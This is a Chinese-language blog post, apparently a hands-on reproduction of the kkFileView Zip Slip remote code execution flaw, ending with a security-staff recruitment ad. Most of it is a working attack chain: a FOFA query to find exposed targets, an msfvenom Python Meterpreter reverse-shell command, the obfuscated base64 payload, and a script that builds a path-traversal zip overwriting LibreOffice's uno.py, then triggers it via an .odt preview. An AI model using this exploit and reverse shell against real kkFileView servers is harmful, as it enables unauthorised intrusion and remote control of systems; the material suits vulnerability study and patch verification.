#  kkfileview远程代码执行漏洞复现--保姆级复现   
hl666  安全小子大杂烩   2024-04-21 21:51  
  
## kkFileView 远程代码执行漏洞复现：  
#### 漏洞成因：  
  
在v4.2.0版本的更新中，由于前台上传功能在处理压缩包时，从仅获取文件名改为获取文件名及其目录，导致出现了Zip Slip漏洞。这使得攻击者可上传包含恶意代码的压缩包并覆盖系统文件，随后通过调用这些被覆盖的文件实现远程代码执行。  
#### 影响范围：  
```
4.2.0 <= kkFileView <= v4.4.0-beta
```  
#### 语法搜索：  
```
fofa：app="kkFileView" 
```  
#### 环境部署：  
```
wget https://kkview.cn/resource/kkFileView-4.2.0-docker.tar
docker load -i kkFileView-4.2.0-docker.tar
docker run -itd -p 8012:8012 keking/kkfileview:4.2.0
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Z1IQ67Y7qFTB44BiaBFm08rSp9poVyVsLtUSvYib9Qg3EaibUOA1KzgAiajuU3b0lhhPlW12MnkHXNRPtaHjwIicytA/640?wx_fmt=png&from=appmsg "null")  
  
访问8012端口，环境就起来了：  
#### 漏洞复现：  
  
考虑到环境以及以及一些命令问题，这里直接选择用msf来反弹shell  
#### msf生成python木马：  
```
msfvenom -p python/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=11321 -f raw -o kkview.py
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Z1IQ67Y7qFTB44BiaBFm08rSp9poVyVsLQ4gXsKrn8huK10dctw1YX0RhVG0TQNhyxWLiaOgribcp2C1cNsXFmJjw/640?wx_fmt=png&from=appmsg "null")  
```
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T01LAzEQPW9+RW5JMIamrj0UVxDxICKC9SYiu8m0hs0mIUl1VfzvNqbIwAxv3puPZ6bgY8bJqxEy/7Jm4EOfYNXylONeZZ7NBGjrI56xcTj2bgdULtgaNTl+HnKTujosaqFLfsSbh+u7183T483VPSs6obxzoDKlRIq/IFzKs6VkhR4i9CNqYFYQctlbDotkAQI9Z8h29R+xd6FXIyWXt4QnEUG905ax58UL0t0RW4Y+3owFbMFRzS7sYZ0++WdPa5shmEHRYlloUH4KEVKi1b0YVm1paihK/k0SWacfhn4BkdFeGg==')[0])))
```  
#### 替换如下脚本：  
  
注意点一：将上述的'进行转义，用'  
  
注意点二：/opt/libreoffice7.3/program/uno.py 该路径注意下，很多脚本都是/opt/libreoffice7.5/program/uno.py路径，这里根据版本和实际情况来的，这里环境就是7.3的  
```
import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'test'
        binary2 = b'exec(__import__(\'zlib\').decompress(__import__(\'base64\').b64decode(__import__(\'codecs\').getencoder(\'utf-8\')(\'eNo9T01LAzEQPW9+RW5JMIamrj0UVxDxICKC9SYiu8m0hs0mIUl1VfzvNqbIwAxv3puPZ6bgY8bJqxEy/7Jm4EOfYNXylONeZZ7NBGjrI56xcTj2bgdULtgaNTl+HnKTujosaqFLfsSbh+u7183T483VPSs6obxzoDKlRIq/IFzKs6VkhR4i9CNqYFYQctlbDotkAQI9Z8h29R+xd6FXIyWXt4QnEUG905ax58UL0t0RW4Y+3owFbMFRzS7sYZ0++WdPa5shmEHRYlloUH4KEVKi1b0YVm1paihK/k0SWacfhn4BkdFeGg==\')[0])))'
        zipFile = zipfile.ZipFile("hack.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("hack.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.3/program/uno.py", binary2)
        zipFile.close()
    except IOError as e:
        raise e
```  
  
利用脚本生成zip文件，然后随便简历一个odt文件即可：  
#### 触发漏洞：  
  
这里先上传zip文件进行预览：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Z1IQ67Y7qFTB44BiaBFm08rSp9poVyVsLvmClmBTpybic1B1jicqIJlRk1LaQWwrWY31D9ybv5bgoicibne1GCO4SBw/640?wx_fmt=png&from=appmsg "null")  
  
image-20240421212837883  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Z1IQ67Y7qFTB44BiaBFm08rSp9poVyVsL2R1BlDfmMpmcvlZCWPNhX7msSudibZibO68icb4cQ60D2D2UzOdyWg1kg/640?wx_fmt=png&from=appmsg "null")  
  
紧接着上传otd文件(可以新建一个word，改名为otd后缀即可)，点击预览，即可触发该漏洞，msf收到shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Z1IQ67Y7qFTB44BiaBFm08rSp9poVyVsL9c3xInLBGsa2l11m6uYaGYQJmW5XvicicFpoF6JQgm21yXPUIn3Vc3kg/640?wx_fmt=png&from=appmsg "null")  
  
image-20240421212955066  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Z1IQ67Y7qFTB44BiaBFm08rSp9poVyVsLFrkVlWrFKgibQB5sgcMerPs9bD7dcEObic4qsxS3kGy9I50ncO3rbqWg/640?wx_fmt=png&from=appmsg "null")  
  
image-20240421213044699  
  
查看opt/libreoffice7.3/program/uno.py文件，发现恶意脚本已经写入成功，并成功触发  
  
  
  
目前招聘hw蓝对，初，中，高级人员，近期准备面试，欢迎各位师傅投递简历  
  
**薪资待遇**  
  
● 面试定级，日薪1k-4k，能力突出者上不封顶  
  
● 进场预付款：4k  
  
● 商业保险：  
**签约者每人一份医疗、意外、身故等保险**  
  
  
● 地点：全国一线城市为主，其他城市为辅  
  
● 或联系以下微信，近期准备面试，备注姓名-级别  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Z1IQ67Y7qFREpd620A7F1jtNuwYogk7kldImrXpvh1e2b6oEOIAic2uht8LlZkjDnpfAWgUom5At8eupxHs9ZFA/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
